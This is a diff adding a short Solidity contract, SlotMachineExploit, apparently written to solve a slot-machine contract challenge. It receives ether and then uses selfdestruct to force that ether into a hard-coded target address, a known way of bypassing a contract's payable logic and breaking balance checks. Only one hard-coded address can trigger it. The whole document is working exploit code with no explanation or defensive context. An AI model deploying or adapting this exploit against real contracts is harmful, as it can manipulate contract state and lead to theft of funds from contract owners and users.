@@ -1,0 +1,15 @@
+pragma solidity ^0.4.24;
+
+contract SlotMachineExploit {
+    //SlotMachine address
+    address private slotMachine = 0x17eeD3AF541e4D49a69e58C9f2f7197f4922CfC3;
+    
+    //function to send this contract money
+    function() payable {}
+    
+    //selfdestruct to send slotMachine ether.. Please forgive the name
+    function killMe() external payable{
+        require(msg.sender == 0x173828e45c574057A1B3E60bf880e0c000eb305B);
+        selfdestruct(slotMachine);
+    }
+}
